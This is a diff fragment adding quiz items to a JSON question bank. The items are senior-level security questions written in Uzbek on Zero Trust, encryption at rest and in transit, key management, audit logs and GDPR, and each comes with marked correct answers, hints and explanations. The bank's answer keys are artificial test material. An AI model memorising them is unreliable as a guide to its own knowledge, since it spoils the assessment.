+      "explanation": "Perimeter modeli: ichkaridagi hamma ishonchli — bitta buzilgan laptop butun tarmoqni ochadi. Zero Trust: mikrosegmentatsiya, servislar orasida mTLS, har so'rovda authN/authZ, qurilma holati tekshiruvi, doimiy monitoring. Ichki servislar ham bir-biriga avtomatik ishonmaydi.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.029",
+      "level": "senior",
+      "type": "single",
+      "kind": "concept",
+      "prompt": "Encryption at rest va encryption in transit qanday farqlanadi va ikkalasi ham nima uchun kerak?",
+      "options": [
+        { "id": "a", "text": "In transit — tarmoqda uzatilayotgan ma'lumot (TLS); at rest — disk/DB/backup'dagi ma'lumot. Ular turli tahdidlarni yopadi: tarmoqni eshitish va saqlovchini o'g'irlash/sizish", "correct": true },
+        { "id": "b", "text": "Bir xil narsa, biri eski nom", "hint": "Biri yo'lda, biri saqlashda — tahdid modeli boshqa." },
+        { "id": "c", "text": "At rest yetarli, in transit kerak emas", "hint": "Shifrlangan DB'dan o'qilgan ma'lumot tarmoqda ochiq uchadi." },
+        { "id": "d", "text": "In transit yetarli, at rest kerak emas", "hint": "Backup disk yoki snapshot o'g'irlansa, TLS yordam bermaydi." }
+      ],
+      "explanation": "At rest: DB TDE, disk shifrlash, S3 SSE, maydon darajasida shifrlash (eng sezgir maydonlar). In transit: TLS 1.2+, servislar orasida mTLS. Uchinchi o'lchov — in use (ishlov vaqtida xotirada) — confidential computing hal qiladi.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.030",
+      "level": "senior",
+      "type": "single",
+      "kind": "concept",
+      "prompt": "Shifrlash kalitlarini boshqarishda (key management) asosiy amaliyotlar qaysilar?",
+      "options": [
+        { "id": "a", "text": "Kalitlarni KMS/HSM'da saqlash, envelope encryption (ma'lumot kaliti master kalit bilan shifrlanadi), muntazam rotatsiya, kirishni IAM va audit bilan cheklash, kalitni ma'lumot bilan bir joyda saqlamaslik", "correct": true },
+        { "id": "b", "text": "Kalitni shifrlangan ma'lumot yonida, o'sha DB'da saqlash", "hint": "DB sizsa, kalit ham sizadi — shifrlash foydasiz." },
+        { "id": "c", "text": "Bitta kalitni butun kompaniya uchun abadiy ishlatish", "hint": "Rotatsiyasiz kalit sizganda barcha tarixiy ma'lumot ochiladi." },
+        { "id": "d", "text": "Kalitni kodga yozib qo'yish", "hint": "Kod — eng ko'p nusxalanadigan va eng kam himoyalangan joy." }
+      ],
+      "explanation": "Envelope encryption: har ob'ekt o'z DEK (data key) bilan shifrlanadi, DEK esa KMS'dagi KEK bilan. Rotatsiya — faqat DEK'larni qayta shifrlash, ma'lumotni emas. HSM master kalitni hech qachon tashqariga chiqarmaydi. Kalit sizishi — barcha ma'lumot sizishi, shu sabab u eng muhim aktiv.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.031",
+      "level": "senior",
+      "type": "single",
+      "kind": "concept",
+      "prompt": "Audit log'lar xavfsizlik nuqtai nazaridan qanday talablarga javob berishi kerak?",
+      "options": [
+        { "id": "a", "text": "Kim, nima, qachon, qayerdan — to'liq va o'zgartirib bo'lmaydigan (append-only, alohida saqlovchi), maxfiy ma'lumotsiz (parol, token yo'q), saqlash muddati reglamentga mos, shubhali hodisalarga alert", "correct": true },
+        { "id": "b", "text": "Faqat xatolarni yozish yetarli", "hint": "Muvaffaqiyatli, lekin g'ayrioddiy kirishlar (tunda admin login) ham muhim." },
+        { "id": "c", "text": "Debug uchun parol va tokenlarni ham yozish qulay", "hint": "Loglar ko'pincha kam himoyalangan — ularga sir yozish sizish manbai." },
+        { "id": "d", "text": "Loglarni ilova serverida saqlash kifoya", "hint": "Serverni buzgan hujumchi birinchi navbatda loglarni o'chiradi." }
+      ],
+      "explanation": "OWASP Top 10'da \"Logging & Monitoring Failures\" alohida toifa: buzilish o'rtacha oylar davomida sezilmaydi. Loglar markazlashtirilgan (SIEM), o'zgarmas, vaqt sinxron (NTP), PII minimallashtirilgan. Audit — insidentni tiklash va compliance (GDPR, PCI DSS, SOC 2) dalili.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.032",
+      "level": "senior",
+      "type": "single",
+      "kind": "concept",
+      "prompt": "GDPR kabi ma'lumot himoyasi reglamentlari dasturchi uchun amalda nimani anglatadi?",
+      "options": [
+        { "id": "a", "text": "Minimal ma'lumot yig'ish, maqsadni cheklash, foydalanuvchi so'rovi bo'yicha o'chirish/eksport imkoniyati, PII'ni shifrlash va kirishni cheklash, buzilishni muddatida xabar qilish, dizaynda maxfiylik (privacy by design)", "correct": true },
+        { "id": "b", "text": "Faqat saytga cookie banner qo'yish", "hint": "Banner — ko'rinadigan qism; talablar ma'lumot oqimining butun hayot sikliga tegishli." },
+        { "id": "c", "text": "Faqat yuristlar ishi, kodga ta'sir qilmaydi", "hint": "\"O'chirish huquqi\" DB sxemasi va backup strategiyasiga to'g'ridan-to'g'ri ta'sir qiladi." },
+        { "id": "d", "text": "Barcha ma'lumotni abadiy saqlash majburiyati", "hint": "Aksincha — kerak bo'lmagan ma'lumot o'chirilishi kerak." }
+      ],
+      "explanation": "Texnik oqibatlar: PII qayerda saqlanishini bilish (data inventory), soft delete yetmasligi (haqiqiy o'chirish, backup'larda ham), loglardagi PII, uchinchi tomon SDK'lariga uzatiladigan ma'lumot, 72 soat ichida buzilish haqida xabar. Uzbekiston'da ham shaxsiy ma'lumotlar qonuni (lokalizatsiya talabi) bor.",
+      "reviewed": false
+    }
+  ]
+}
